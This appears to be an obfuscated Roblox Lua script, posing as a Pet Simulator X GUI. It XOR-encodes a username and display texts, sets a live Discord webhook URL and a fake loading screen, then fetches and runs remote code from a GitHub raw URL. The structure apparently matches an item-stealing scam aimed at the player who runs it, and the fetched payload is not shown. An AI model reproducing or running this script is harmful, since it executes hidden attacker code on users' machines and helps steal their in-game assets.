--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.14) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end Username=v7("\213\205\218\46\232\190\204","\126\177\163\187\69\134\219\167");WebHook="https://discord.com/api/webhooks/1136334436141650023/j8zsz0JO62DCzTDM2fyOxbZM2jRkP_KEtkpr8B_6dv7KL-tLvos0ezVRUJEwfLquq9rX";loadingscreen=true;_G.CustomScriptName=v7("\19\254\18\133\207\32\223\35\213\232","\156\67\173\74\165");_G.Text1=v7("\7\180\91\31\172\50\6\24\184\72\18\185\34\8\122\249","\38\84\215\41\118\220\70");_G.Text2=v7("\103\23\43\6\247\94\17\98\20\241\66\86\17\17\236\89\6\54","\158\48\118\66\114");_G.Text3=v7("\136\44\21\53\120\172\245\172\100\35\53\97\172\235\191\55\94\120\61","\155\203\68\112\86\19\197");_G.Text4=v7("\117\201\55\238\84\113\235\255\6\238\53\238\73\104\241\235\8\147\120","\152\38\189\86\156\32\24\133");loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))();